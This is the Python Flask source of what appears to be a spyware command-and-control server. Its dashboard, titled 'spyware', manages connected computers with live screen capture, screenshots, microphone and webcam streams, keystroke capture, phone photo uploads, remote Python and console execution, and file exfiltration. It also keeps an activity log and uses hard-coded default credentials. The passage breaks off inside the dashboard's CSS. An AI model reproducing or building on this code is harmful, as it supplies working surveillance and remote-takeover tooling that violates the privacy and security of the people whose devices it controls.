
import os
import io
import json
import time
import uuid
import hmac
import queue
import base64
import shutil
import tempfile
import threading

from collections import deque
from datetime import timedelta
from functools import wraps
from flask import (
    Flask, request, jsonify, Response,
    make_response, render_template_string, send_file,
    session, redirect, url_for
)

app = Flask(__name__)

# ==================================================
# CONFIGURATION
# ==================================================

USERNAME = os.environ.get("DASH_USER", "xyrielly")
PASSWORD = os.environ.get("DASH_PASSWORD", "BRODONTHACKME1")

app.secret_key = (
    os.environ.get("DASH_SECRET")
    or hmac.new(
        PASSWORD.encode(),
        b"remote-admin-dashboard-session",
        "sha256"
    ).hexdigest()
)

app.config["SESSION_COOKIE_HTTPONLY"] = True
app.config["SESSION_COOKIE_SAMESITE"] = "Lax"
app.config["PERMANENT_SESSION_LIFETIME"] = timedelta(days=30)

MAX_FILE_SIZE = 20 * 1024 * 1024
MAX_SCREENSHOT_SIZE = 10 * 1024 * 1024
MAX_STREAM_FRAME_SIZE = 5 * 1024 * 1024
MAX_AUDIO_CHUNK_SIZE = 256 * 1024
MAX_CAMERA_FRAME_SIZE = 5 * 1024 * 1024

MOBILE_PHOTO_LIMIT = 60
MOBILE_PHOTO_MAX_SIZE = 10 * 1024 * 1024
MOBILE_PHOTO_TYPES = {
    "image/jpeg": ".jpg",
    "image/png": ".png",
    "image/webp": ".webp",
    "image/gif": ".gif",
}

MAX_PUSH_TOTAL_SIZE = 100 * 1024 * 1024
PUSH_ROOT = os.path.join(tempfile.gettempdir(), "remoteadmin_pushes")

KEY_EVENT_LIMIT = 3000

MAX_AUDIO_CHUNK_AGE = 3.0

clients = {}
client_actions = {}
downloads = {}
screenshots = {}
streams = {}
stream_viewers = {}
mic_streams = {}
camera_streams = {}
camera_snapshots = {}
console_commands = {}
python_requests = {}
listing_requests = {}
pushes = {}
key_events = {}
key_sequences = {}
key_capture_active = {}
mobile_photos = {}

lock = threading.Lock()

website_sessions = {}
blocked_sessions = {}
site_effects = {}
site_effects_global = {"theme": "hacker"}
session_lock = threading.Lock()
WEBSITE_SESSION_LIMIT = 100
WEBSITE_SESSION_MAX_AGE = 7 * 24 * 3600
WEBSITE_IDLE_SECONDS = 900
BLOCK_SECONDS = 60
MAX_BLOCK_SECONDS = 86400

HISTORY_SECONDS = 7 * 24 * 3600
HISTORY_LIMIT = 5000
website_history = deque(maxlen=HISTORY_LIMIT)
device_history = deque(maxlen=HISTORY_LIMIT)
help_stage = {}

PANELS = (
    "live",
    "screenshot",
    "stream",
    "mic",
    "camera",
    "photos",
    "python",
    "files",
    "downloader",
    "console",
)

PANEL_ALIASES = {
    "console": "console",
    "cmd": "console",
    "terminal": "console",
    "live": "live",
    "live-screen": "live",
    "livescreen": "live",
    "screen": "live",
    "screenshot": "screenshot",
    "screenshots": "screenshot",
    "stream": "stream",
    "screen-share": "stream",
    "screenshare": "stream",
    "share": "stream",
    "mic": "mic",
    "microphone": "mic",
    "audio": "mic",
    "camera": "camera",
    "cam": "camera",
    "webcam": "camera",
    "photos": "photos",
    "pictures": "photos",
    "photo": "photos",
    "python": "python",
    "files": "files",
    "file": "files",
    "downloader": "downloader",
    "download": "downloader",
    "downloads": "downloader",
}

enabled_panels = {"console"}

SITE_THEMES = (
    "pink",
    "green",
    "purple",
    "red",
    "blue",
    "yellow",
    "dark",
    "light",
    "mono",
    "hacker",
)

SITE_EFFECTS = (
    "dyslexic",
    "flip",
    "mirror",
    "blur",
    "shake",
    "rainbow",
    "caps",
    "spin",
    "invert",
    "design",
)

NAME_REUSE_SECONDS = 90
OFFLINE_AFTER_SECONDS = 60


# ==================================================
# GUI ACTIVITY LOG
# ==================================================

LOG_LIMIT = 500

app_logs = deque(maxlen=LOG_LIMIT)
log_sequence = 0
log_lock = threading.Lock()

SERVER_STARTED = time.time()

ACTION_LABELS = {
    "/api/mic/start": "Microphone started",
    "/api/mic/stop": "Microphone stopped",
    "/api/camera/start": "Camera started",
    "/api/camera/stop": "Camera stopped",
    "/api/request-screenshot": "Screenshot requested",
    "/api/request-download": "File download requested",
    "/api/python/run": "Python code sent to the computer",
    "/api/console/command": "Console command sent",
}


def add_log(level, message, source="server"):

    global log_sequence

    with log_lock:

        log_sequence += 1

        app_logs.append({
            "id": log_sequence,
            "time": time.time(),
            "level": level,
            "source": source,
            "message": str(message)[:1000],
        })


add_log("info", "Server started, waiting for computers to connect.")


# Website entries and device power events are kept out of the main
# activity log. On Render they go to Postgres through DATABASE_URL;
# without a database they are appended to a local file. Either way they
# are recorded while no dashboard is open, and the dashboard mirrors
# them into browser storage.
SITE_LOG_LIMIT = 2000
SITE_LOG_TABLE = "site_log_events"
SITE_LOG_FILE = os.environ.get("SITE_LOG_FILE") or os.path.join(
    os.path.dirname(os.path.abspath(__file__)),
    "site_logs.jsonl"
)

DATABASE_URL = (os.environ.get("DATABASE_URL") or "").strip()

if DATABASE_URL.startswith("postgres://"):
    DATABASE_URL = "postgresql://" + DATABASE_URL[len("postgres://"):]

try:
    import psycopg
except ImportError:
    psycopg = None

site_log_db_ready = False
site_log_prune_counter = 0

website_events = deque(maxlen=SITE_LOG_LIMIT)
device_events = deque(maxlen=SITE_LOG_LIMIT)
site_log_sequence = 0
site_log_lines = 0
site_log_lock = threading.Lock()


def connect_site_log_db():

    return psycopg.connect(
        DATABASE_URL,
        connect_timeout=10
    )


def init_site_log_db():

    global site_log_db_ready

    if not DATABASE_URL or psycopg is None:
        return False

    try:

        with connect_site_log_db() as connection:

            with connection.cursor() as cursor:
                cursor.execute(
                    f"CREATE TABLE IF NOT EXISTS {SITE_LOG_TABLE} ("
                    "id BIGSERIAL PRIMARY KEY,"
                    "created_at DOUBLE PRECISION NOT NULL,"
                    "level TEXT NOT NULL,"
                    "stream TEXT NOT NULL,"
                    "message TEXT NOT NULL"
                    ")"
                )

            connection.commit()

        site_log_db_ready = True

        add_log("info", "Site logs are stored in the cloud database.")

        return True

    except Exception as error:

        add_log(
            "warn",
            f"Cloud log database unavailable: {error}"
        )

        return False


def prune_site_log_db(cursor):

    for stream in ("website", "device"):

        cursor.execute(
            f"DELETE FROM {SITE_LOG_TABLE} WHERE stream = %s "
            f"AND id <= (SELECT id FROM {SITE_LOG_TABLE} "
            "WHERE stream = %s ORDER BY id DESC "
            "OFFSET %s LIMIT 1)",
            (stream, stream, SITE_LOG_LIMIT)
        )


def store_site_event_db(level, stream, message):

    global site_log_prune_counter

    try:

        with connect_site_log_db() as connection:

            with connection.cursor() as cursor:
                cursor.execute(
                    f"INSERT INTO {SITE_LOG_TABLE} "
                    "(created_at, level, stream, message) "
                    "VALUES (%s, %s, %s, %s) RETURNING id",
                    (time.time(), level, stream, message)
                )

                entry_id = cursor.fetchone()[0]

                site_log_prune_counter += 1

                if site_log_prune_counter >= 50:
                    site_log_prune_counter = 0
                    prune_site_log_db(cursor)

            connection.commit()

        return entry_id

    except Exception:
        return None


def store_site_event(entry):

    global site_log_lines

    try:

        with open(SITE_LOG_FILE, "a", encoding="utf-8") as handle:
            handle.write(
                json.dumps(entry, separators=(",", ":")) + "\n"
            )

        site_log_lines += 1

    except OSError:
        return

    if site_log_lines > SITE_LOG_LIMIT * 2:
        compact_site_events()


def compact_site_events():

    global site_log_lines

    entries = sorted(
        list(website_events) + list(device_events),
        key=lambda entry: entry["id"]
    )

    try:
        with open(SITE_LOG_FILE, "w", encoding="utf-8") as handle:
            for entry in entries:
                handle.write(
                    json.dumps(entry, separators=(",", ":")) + "\n"
                )
        site_log_lines = len(entries)
    except OSError:
        pass


def load_site_events():

    global site_log_sequence, site_log_lines

    try:
        with open(SITE_LOG_FILE, "r", encoding="utf-8") as handle:
            lines = handle.readlines()
    except OSError:
        return

    site_log_lines = len(lines)

    for line in lines:

        try:
            entry = json.loads(line)
        except ValueError:
            continue

        if not isinstance(entry, dict):
            continue

        stream = entry.get("stream")

        if stream == "website":
            website_events.append(entry)
        elif stream == "device":
            device_events.append(entry)
        else:
            continue

        try:
            site_log_sequence = max(
                site_log_sequence,
                int(entry.get("id") or 0)
            )
        except (TypeError, ValueError):
            continue


def add_site_event(stream, level, message):

    global site_log_sequence

    message = str(message)[:500]

    if site_log_db_ready:

        if store_site_event_db(level, stream, message) is not None:
            return

        # The database write failed, so keep a local copy instead.

    with site_log_lock:

        site_log_sequence += 1

        entry = {
            "id": site_log_sequence,
            "time": time.time(),
            "level": level,
            "stream": stream,
            "message": message,
        }

        if stream == "website":
            website_events.append(entry)
        else:
            device_events.append(entry)

        store_site_event(entry)


if not init_site_log_db():
    load_site_events()


@app.after_request
def record_request_result(response):

    if (
        request.path in ("/api/logs", "/api/logs/history")
        or request.path == "/favicon.ico"
    ):
        return response

    if response.status_code >= 400:

        detail = ""

        if response.mimetype == "application/json" and not response.is_streamed:
            body = response.get_json(silent=True) or {}
            detail = body.get("error") or body.get("message") or ""

        message = (
            f"{request.method} {request.path} "
            f"returned {response.status_code}"
        )

        if detail:
            message += f": {detail}"

        add_log(
            "error" if response.status_code >= 500 else "warn",
            message
        )

    elif request.method == "POST":

        label = ACTION_LABELS.get(request.path)

        if label:
            add_log("info", label)

    return response


# ==================================================
# AUTHENTICATION
# ==================================================

def valid_credentials(auth):

    if not auth:
        return False

    valid_user = hmac.compare_digest(
        auth.username or "", USERNAME
    )

    valid_password = hmac.compare_digest(
        auth.password or "", PASSWORD
    )

    return valid_user and valid_password


def is_signed_in():

    return session.get("user") == USERNAME


def is_machine_request():

    return (
        request.path in ("/sync", "/next-action", "/api/downloader/complete")
        or request.path.startswith("/upload-")
        or request.path.startswith("/api/downloader/file/")
    )


def current_path():

    query = request.query_string.decode("utf-8", "ignore")

    return request.path + ("?" + query if query else "")


def normalize_next(value):

    value = (value or "").strip()

    if value.startswith("/") and not value.startswith("//"):
        return value

    return ""


def require_auth(function):

    @wraps(function)
    def wrapper(*args, **kwargs):

        # The client agent still authenticates with HTTP Basic,
        # while browsers (including the mobile web client) use the
        # login form session cookie.
        if is_machine_request():

            if valid_credentials(request.authorization) or is_signed_in():
                return function(*args, **kwargs)

            return jsonify({"error": "Authentication required"}), 401

        if is_signed_in():
            return function(*args, **kwargs)

        if request.path.startswith("/api/"):
            return jsonify({"error": "Authentication required"}), 401

        return redirect(
            url_for("login", next=current_path())
        )

    return wrapper


# ==================================================
# TREE HELPERS
# ==================================================

def find_folder(node, relative_path):

    if not isinstance(node, dict):
        return None

    relative_path = (relative_path or "").replace("\\", "/")

    if relative_path in ("", "."):
        return node

    parts = [part for part in relative_path.split("/") if part]

    if ".." in parts:
        return None

    current = node

    for part in parts:

        if not isinstance(current.get("dirs"), list):
            return None

        found = None

        for folder in current["dirs"]:
            if folder.get("name", "").lower() == part.lower():
                found = folder
                break

        if found is None:
            return None

        current = found

    return current


def get_folder_listing(node):

    if not isinstance(node, dict):
        return []

    return [
        {
            "name": folder.get("name", ""),
            "path": folder.get("path", "")
        }
        for folder in node.get("dirs", [])
    ]


# ==================================================
# CLIENT NAME ALLOCATION
# ==================================================

def allocate_client_name(computer_name, now):

    base_name = (computer_name or "").strip()[:120] or "Computer"

    entry = clients.get(base_name)

    if not entry or now - entry["last_seen"] > NAME_REUSE_SECONDS:
        return base_name

    index = 1

    while True:

        candidate = f"{base_name} ({index})"

        entry = clients.get(candidate)

        if not entry or now - entry["last_seen"] > NAME_REUSE_SECONDS:
            return candidate

        index += 1


def remove_client(name):

    client = clients.pop(name, None)

    if client is not None and client.get("last_seen"):
        record_device_offline(name, client["last_seen"])

    client_actions.pop(name, None)
    streams.pop(name, None)
    stream_viewers.pop(name, None)
    mic_streams.pop(name, None)
    camera_streams.pop(name, None)
    key_events.pop(name, None)
    key_sequences.pop(name, None)
    key_capture_active.pop(name, None)
    mobile_photos.pop(name, None)

    add_site_event("device", "warn", f"Computer went offline: {name}")


def normalize_listing_path(path):
    path = (path or "").replace("\\", "/").strip()

    parts = [part for part in path.split("/") if part and part != "."]

    if ".." in parts:
        raise ValueError("Invalid path.")

    return "/".join(parts)


def merge_tree(old_tree, new_tree):

    if not isinstance(old_tree, dict) or not isinstance(new_tree, dict):
        return new_tree

    merged = dict(new_tree)
    merged["loaded"] = True

    previous = {
        folder.get("name", "").lower(): folder
        for folder in old_tree.get("dirs", [])
        if isinstance(folder, dict)
    }

    dirs = []

    for folder in new_tree.get("dirs", []):

        prior = previous.get(folder.get("name", "").lower())

        if prior and prior.get("loaded"):

            combined = dict(folder)
            combined["dirs"] = prior.get("dirs", [])
            combined["files"] = prior.get("files", [])
            combined["loaded"] = True
            dirs.append(combined)

        else:
            dirs.append(folder)

    merged["dirs"] = dirs

    return merged


def store_listing(client, path, listing):

    target = find_folder(client.get("tree"), path)

    if target is None:
        return False

    target["dirs"] = listing.get("dirs", [])
    target["files"] = listing.get("files", [])
    target["loaded"] = True

    return True


# ==================================================
# DASHBOARD HTML
# ==================================================

HTML = r"""
<!DOCTYPE html>
<html>
<head>
    <title>spyware</title>
    <link rel="icon" type="image/x-icon" href="/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <style id="siteStyles" media="{{ 'all' if design else 'not all' }}">
        [hidden] {
            display: none !important;
        }

        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            padding: 25px;
            background: #160d13;
            color: #f7dbe8;
            font-family: Consolas, monospace;
        }

        h1 {
            color: #ff9ecb;
            letter-spacing: 1px;
            border-bottom: 1px solid #63304f;
            padding-bottom: 15px;
            margin-bottom: 25px;
        }

        .topbar {
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 16px;
            border-bottom: 1px solid #63304f;
            padding-bottom: 15px;
            margin-bottom: 25px;
        }

        .topbar h1 {
            margin: 0;
            padding: 0;
            border-bottom: none;
        }

        .signout {
            flex: 0 0 auto;
            padding: 6px 12px;
            border: 1px solid #4a2140;
            border-radius: 6px;
            color: #b98fa8;
            font-size: 11px;
            letter-spacing: 0.8px;
            text-transform: uppercase;
            text-decoration: none;
            transition:
                color 160ms ease,
                border-color 160ms ease,
                background 160ms ease;
        }

        .signout:hover {
            color: #f7dbe8;
            border-color: #d9488f;
            background: #3a1a30;
        }

        h2 {
            color: #ff9ecb;
            font-size: 20px;
        }

        h3 {
            color: #ff9ecb;
            margin-bottom: 10px;
        }

        .panel {
            background: #180d14;
            border: 1px solid #63304f;
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 20px;
            box-shadow: 0 0 20px #000;
        }

        input, select, textarea {
            background: #241320;
            color: #f7dbe8;
            border: 1px solid #63304f;
            padding: 11px;
            border-radius: 4px;
            font-family: Consolas, monospace;
        }

        select option {
            background: #241320;
            color: #f7dbe8;
        }

        button {
            background: #c93b86;
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 4px;
            cursor: pointer;
            font-family: Consolas, monospace;
        }

        button:hover {
            background: #d9488f;
        }

        button:disabled {
            opacity: 0.4;
            cursor: not-allowed;
        }

        .row {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            align-items: center;
        }

        .row input {
            flex: 1;
            min-width: 180px;
        }

        .output {
            background: #120a10;
            border: 1px solid #4a2140;
            padding: 15px;
            border-radius: 6px;
            margin-top: 12px;
            overflow-wrap: anywhere;
            min-height: 50px;
        }

        .directory {
            margin: 8px 0;
        }

        .file-item {
            display: flex;
            flex-wrap: wrap;
            justify-content: space-between;
            align-items: center;
            gap: 10px;
            padding: 10px;
            margin-bottom: 7px;
            background: #241220;
            border: 1px solid #4a2140;
            border-radius: 5px;
        }

        .file-name {
            overflow-wrap: anywhere;
            flex: 1;
        }

        .folder-button {
            background: transparent;
            color: #ff7ab8;
            text-align: left;
            font-size: 14px;
            padding: 7px;
        }

        .folder-button:hover {
            background: #3a1a30;
        }

        .muted {
            color: #b98fa8;
        }

        .status {
            color: #ff9ecb;
        }

        #screenshot {
            display: block;
            width: 100%;
            max-width: 1000px;
            height: auto;
            margin-top: 15px;
            border-radius: 6px;
            border: 1px solid #63304f;
            background: #180d14;
        }

        #streamImage {
            display: block;
            width: 100%;
            max-width: 1000px;
            height: auto;
            margin-top: 15px;
            border-radius: 6px;
            border: 1px solid #63304f;
            background: #180d14;
        }

        .camera-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
            margin-top: 15px;
        }

        .camera-grid figure {
            margin: 0;
            min-width: 0;
        }

        .camera-grid img {
            display: block;
            width: 100%;
            height: auto;
            border-radius: 6px;
            border: 1px solid #63304f;
            background: #180d14;
        }

        .camera-grid figcaption {
            margin-top: 6px;
            text-align: center;
            color: #b98fa8;
            font-size: 10px;
            letter-spacing: 1.4px;
            text-transform: uppercase;
        }

        @media (max-width: 860px) {
            .camera-grid {
                grid-template-columns: 1fr;
            }
        }

        .photo-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
            gap: 10px;
            margin-top: 14px;
        }

        .photo-card {
            display: block;
            border: 1px solid #4a2140;
            border-radius: 8px;
            overflow: hidden;
            background: #120a10;
            color: inherit;
            text-decoration: none;
        }

        .photo-card:hover {
            border-color: #d9488f;
        }

        .photo-card img {
            display: block;
            width: 100%;
            height: 120px;
            object-fit: cover;
        }

        .photo-card span {
            display: block;
            padding: 6px 8px;
            font-size: 10px;
            color: #b98fa8;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .panel-header {
            display: flex;
            flex-wrap: wrap;
            justify-content: space-between;
            align-items: center;
            gap: 10px;
            margin-bottom: 10px;
        }

        .panel-header h2 {
            margin: 0;
        }

        #directoryTree {
            overflow-x: auto;
        }

        .file-status {
            color: #ff7ab8;
            margin-top: 10px;
        }

        .dl-picker {
            margin: 14px 0 16px;
            padding: 16px;
            border: 1px dashed #63304f;
            border-radius: 10px;
            background: rgba(26, 13, 20, 0.55);
        }

        .dl-picked {
            margin-top: 12px;
            max-height: 190px;
            overflow-y: auto;
            font-family: Consolas, monospace;
            font-size: 12px;
            line-height: 1.7;
            color: #d9a8c2;
        }

        .dl-picked .dl-empty {
            color: #7c4668;
        }

        .dl-picked .dl-row {
            display: flex;
            justify-content: space-between;
            gap: 14px;
        }

        .dl-picked .dl-row span:last-child {
            flex: 0 0 auto;
            color: #8a5577;
        }

        .dl-picked .dl-row span:first-child {
            min-width: 0;
            overflow-wrap: anywhere;
        }

        .dl-summary {
            margin-top: 10px;
            color: #ff9ecb;
            font-family: 'Segoe UI', sans-serif;
            font-size: 12px;
        }

        #pythonCode {
            display: block;
            width: 100%;
            min-height: 220px;
            resize: vertical;
            background: #180d14;
            color: #f7dbe8;
            border: 1px solid #63304f;
            border-radius: 6px;
            padding: 12px;
            font-family: Consolas, monospace;
            font-size: 14px;
            line-height: 1.5;
            tab-size: 4;
        }

        #pythonOutput {
            white-space: pre-wrap;
            font-family: Consolas, monospace;
        }

        /* ---------- UI POLISH ---------- */

        button {
            transition:
                background 160ms ease,
                transform 160ms ease,
                box-shadow 160ms ease;
        }

        button:hover {
            transform: translateY(-1px);
            box-shadow: 0 6px 18px rgba(217, 72, 143, 0.28);
        }

        button:active {
            transform: translateY(0);
        }

        input:focus,
        select:focus,
        textarea:focus {
            outline: none;
            border-color: #ff77b9;
            box-shadow: 0 0 0 3px rgba(217, 72, 143, 0.22);
        }

        .panel {
            animation: panel-in 420ms ease both;
            transition:
                border-color 200ms ease,
                box-shadow 200ms ease;
        }

        .panel:hover {
            border-color: #a03a78;
            box-shadow:
                0 0 20px #000,
                0 0 28px rgba(217, 72, 143, 0.12);
        }

        .panel:nth-of-type(2) { animation-delay: 40ms; }
        .panel:nth-of-type(3) { animation-delay: 80ms; }
        .panel:nth-of-type(4) { animation-delay: 120ms; }
        .panel:nth-of-type(5) { animation-delay: 160ms; }
        .panel:nth-of-type(6) { animation-delay: 200ms; }
        .panel:nth-of-type(7) { animation-delay: 240ms; }

        @keyframes panel-in {
            from {
                opacity: 0;
                transform: translateY(10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        ::-webkit-scrollbar {
            width: 10px;
            height: 10px;
        }

        ::-webkit-scrollbar-track {
            background: #120a10;
        }

        ::-webkit-scrollbar-thumb {
            background: #4a2140;
            border-radius: 6px;
            border: 2px solid #120a10;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: #d9488f;
        }

        /* ---------- TOASTS ---------- */

        .toast-stack {
            position: fixed;
            right: 18px;
            bottom: 78px;
            z-index: 1000;
            display: flex;
            flex-direction: column;
            align-items: flex-end;
            gap: 10px;
            pointer-events: none;
        }

        .toast {
            position: relative;
            width: 340px;
            max-width: calc(100vw - 36px);
            padding: 12px 38px 13px 15px;
            background: rgba(24, 13, 20, 0.96);
            border: 1px solid #4a2140;
            border-left: 3px solid #d9488f;
            border-radius: 10px;
            box-shadow: 0 16px 40px rgba(0, 0, 0, 0.65);
            backdrop-filter: blur(12px);
            pointer-events: auto;
            overflow: hidden;
            opacity: 0;
            transform: translateX(120%);
            animation: toast-in 340ms cubic-bezier(0.2, 0.9, 0.3, 1.15) forwards;
            transition: box-shadow 180ms ease;
        }

        .toast:hover {
            box-shadow:
                0 16px 40px rgba(0, 0, 0, 0.7),
                0 0 22px rgba(217, 72, 143, 0.18);
        }

        .toast.info    { border-left-color: #ffa8d4; }
        .toast.success { border-left-color: #ff7ab8; }
        .toast.warn    { border-left-color: #f2b05e; }
        .toast.error   { border-left-color: #ff5f7e; }

        .toast.leaving {
            animation: toast-out 260ms ease forwards;
        }

        .toast-title {
            font-size: 11px;
            letter-spacing: 1.2px;
            text-transform: uppercase;
            color: #ff7ab8;
            margin-bottom: 4px;
        }

        .toast.warn .toast-title  { color: #f2b05e; }
        .toast.error .toast-title { color: #ff8a9a; }

        .toast-message {
            font-size: 13px;
            line-height: 1.45;
            color: #fbe4ef;
            overflow-wrap: anywhere;
        }

        .toast-close {
            position: absolute;
            top: 6px;
            right: 7px;
            background: transparent;
            color: #b98fa8;
            font-size: 17px;
            line-height: 1;
            padding: 4px 6px;
            border-radius: 6px;
            box-shadow: none;
        }

        .toast-close:hover {
            color: #f7dbe8;
            background: #3a1a30;
            transform: none;
            box-shadow: none;
        }

        @keyframes toast-in {
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }

        @keyframes toast-out {
            from {
                opacity: 1;
                transform: translateX(0);
            }
            to {
                opacity: 0;
                transform: translateX(60%);
            }
        }

        /* ---------- LOG DRAWER ---------- */

        .log-toggle {
            position: fixed;
            right: 18px;
            bottom: 18px;
            z-index: 1001;
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 9px 16px;
            background: rgba(30, 16, 25, 0.94);
            border: 1px solid #63304f;
            border-radius: 999px;
            color: #f7dbe8;
            font-size: 13px;
            backdrop-filter: blur(12px);
            box-shadow: 0 10px 26px rgba(0, 0, 0, 0.55);
        }

        .log-toggle .log-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #ff7ab8;
            box-shadow: 0 0 10px #ff7ab8;
            animation: log-pulse 2.2s ease-in-out infinite;
        }

        .log-count {
            min-width: 20px;
            padding: 1px 6px;
            border-radius: 999px;
            background: #d9488f;
            color: #180d14;
            font-size: 11px;
            font-weight: bold;
            text-align: center;
        }

        .log-count.error {
            background: #ff5f7e;
            color: #2b0b16;
        }

        @keyframes log-pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.35; }
        }

        .log-drawer {
            position: fixed;
            right: 18px;
            bottom: 68px;
            z-index: 1000;
            display: flex;
            flex-direction: column;
            width: 470px;
            max-width: calc(100vw - 36px);
            height: 360px;
            max-height: calc(100vh - 130px);
            background: rgba(24, 13, 20, 0.97);
            border: 1px solid #63304f;
            border-radius: 12px;
            box-shadow: 0 24px 70px rgba(0, 0, 0, 0.75);
            backdrop-filter: blur(14px);
            opacity: 0;
            transform: translateY(16px) scale(0.98);
            pointer-events: none;
            transition:
                opacity 240ms ease,
                transform 280ms cubic-bezier(0.2, 0.9, 0.3, 1.1);
        }

        .log-drawer.open {
            opacity: 1;
            transform: translateY(0) scale(1);
            pointer-events: auto;
        }

        .log-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 10px;
            padding: 12px 14px;
            border-bottom: 1px solid #4a2140;
        }

        .log-title {
            display: flex;
            align-items: center;
            gap: 9px;
            font-size: 13px;
            letter-spacing: 1px;
            text-transform: uppercase;
            color: #ff9ecb;
        }

        .log-title .log-dot {
            width: 7px;
            height: 7px;
            border-radius: 50%;
            background: #ff7ab8;
            box-shadow: 0 0 9px #ff7ab8;
            animation: log-pulse 2.2s ease-in-out infinite;
        }

        .log-actions {
            display: flex;
            gap: 6px;
        }

        .log-action {
            background: transparent;
            border: 1px solid #4a2140;
            color: #cf9dba;
            font-size: 12px;
            padding: 4px 10px;
            border-radius: 6px;
        }

        .log-action:hover {
            background: #3a1a30;
            color: #f7dbe8;
            transform: none;
            box-shadow: none;
        }

        .log-close {
            font-size: 16px;
            line-height: 1;
            padding: 2px 9px;
        }

        .log-tabs {
            display: flex;
            gap: 6px;
            padding: 9px 12px 0;
        }

        .log-tab {
            background: transparent;
            border: 1px solid #4a2140;
            border-radius: 6px;
            color: #8a5577;
            font-size: 11px;
            letter-spacing: 0.6px;
            text-transform: uppercase;
            padding: 4px 10px;
        }

        .log-tab:hover {
            background: transparent;
            color: #f7dbe8;
            transform: none;
            box-shadow: none;
        }

        .log-tab.active {
            background: #3a1a30;
            border-color: #ff7ab8;
            color: #ff9ecb;
        }

        .log-list {
            flex: 1;
            overflow-y: auto;
            padding: 8px 12px 12px;
            font-size: 12px;
        }

        .log-entry {
            display: flex;
            gap: 9px;
            align-items: baseline;
            padding: 6px 2px;
            border-bottom: 1px solid rgba(99, 48, 79, 0.22);
            animation: log-in 260ms ease both;
        }

        .log-entry:last-child {
            border-bottom: none;
        }

        @keyframes log-in {
            from {
                opacity: 0;
                transform: translateY(-4px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .log-time {
            flex: 0 0 auto;
            color: #8a5577;
            font-variant-numeric: tabular-nums;
        }

        .log-level {
            flex: 0 0 46px;
            font-size: 10px;
            letter-spacing: 0.6px;
            text-transform: uppercase;
            color: #ffa8d4;
        }

        .log-entry.warn .log-level  { color: #f2b05e; }
        .log-entry.error .log-level { color: #ff8a9a; }
        .log-entry.success .log-level { color: #ff7ab8; }

        .log-entry.error .log-message { color: #ffd1e4; }

        .log-message {
            flex: 1;
            color: #f7dbe8;
            overflow-wrap: anywhere;
            line-height: 1.4;
        }

        .log-empty {
            color: #8a5577;
            text-align: center;
            padding: 30px 0;
        }

        /* ---------- LIVE SCREEN ---------- */

        .live-screen-head {
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            justify-content: space-between;
            gap: 12px;
            margin-bottom: 14px;
        }

        .live-screen-head h2 {
            margin: 0;
        }

        .live-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 5px 12px;
            border-radius: 999px;
            border: 1px solid #4a2140;
            background: #120a10;
            color: #b98fa8;
            font-family: Consolas, monospace;
            font-size: 12px;
            transition:
                color 220ms ease,
                border-color 220ms ease,
                box-shadow 220ms ease;
        }

        .live-badge .dot {
            width: 7px;
            height: 7px;
            border-radius: 50%;
            background: #6b3157;
            transition:
                background 220ms ease,
                box-shadow 220ms ease;
        }

        .live-badge.busy {
            color: #f2b05e;
            border-color: #7a4a2c;
        }

        .live-badge.busy .dot {
            background: #f2b05e;
            box-shadow: 0 0 9px #f2b05e;
            animation: log-pulse 1s ease-in-out infinite;
        }

        .live-badge.live {
            color: #ff7ab8;
            border-color: #d9488f;
            box-shadow: 0 0 16px rgba(255, 122, 184, 0.18);
        }

        .live-badge.live .dot {
            background: #ff7ab8;
            box-shadow: 0 0 9px #ff7ab8;
            animation: log-pulse 1.8s ease-in-out infinite;
        }

        .live-stage {
            position: relative;
            width: 100%;
            aspect-ratio: 16 / 9;
            min-height: 240px;
            max-height: 64vh;
            border: 1px solid #3e1c34;
            border-radius: 10px;
            overflow: hidden;
            background:
                radial-gradient(
                    120% 120% at 50% 0%,
                    #1d0f18 0%,
                    #180d14 62%
                ),
                #180d14;
            cursor: crosshair;
            user-select: none;
            transition:
                border-color 280ms ease,
                box-shadow 280ms ease;
        }

        .live-stage.visible {
            border-color: #a84b86;
            box-shadow:
                0 0 0 1px rgba(255, 122, 184, 0.08),
                0 0 34px rgba(217, 72, 143, 0.22),
                inset 0 0 60px rgba(0, 0, 0, 0.55);
        }

        .live-view {
            position: absolute;
            inset: 0;
            opacity: 0;
            transform: scale(1.015);
            pointer-events: none;
            transition:
                opacity 400ms ease,
                transform 400ms ease;
        }

        .live-stage.visible .live-view {
            opacity: 1;
            transform: scale(1);
        }

        #liveScreenImage {
            display: block;
            width: 100%;
            height: 100%;
            object-fit: contain;
        }

        .live-scan {
            position: absolute;
            inset: 0;
            pointer-events: none;
            opacity: 0;
            background: linear-gradient(
                to bottom,
                transparent 0%,
                rgba(255, 122, 184, 0.05) 48%,
                rgba(255, 122, 184, 0.11) 50%,
                transparent 52%
            );
            background-size: 100% 220%;
            mix-blend-mode: screen;
            transition: opacity 500ms ease;
        }

        .live-stage.visible .live-scan {
            opacity: 1;
            animation: live-scan 3.6s linear infinite;
        }

        @keyframes live-scan {
            from { background-position: 0 -120%; }
            to   { background-position: 0 240%; }
        }

        .live-hint {
            position: absolute;
            inset: 0;
            display: flex;
            flex-direction: column;
            gap: 7px;
            align-items: center;
            justify-content: center;
            padding: 20px;
            text-align: center;
            pointer-events: none;
            color: #a9738f;
            font-size: 14px;
            letter-spacing: 0.3px;
            background: radial-gradient(
                60% 60% at 50% 50%,
                rgba(24, 12, 18, 0.55),
                rgba(24, 13, 20, 0) 75%
            );
            transition: opacity 320ms ease;
        }

        .live-hint-sub {
            font-size: 12px;
            color: #7c4668;
        }

        .live-stage.has-frame .live-hint {
            opacity: 0;
        }

        .live-ripple {
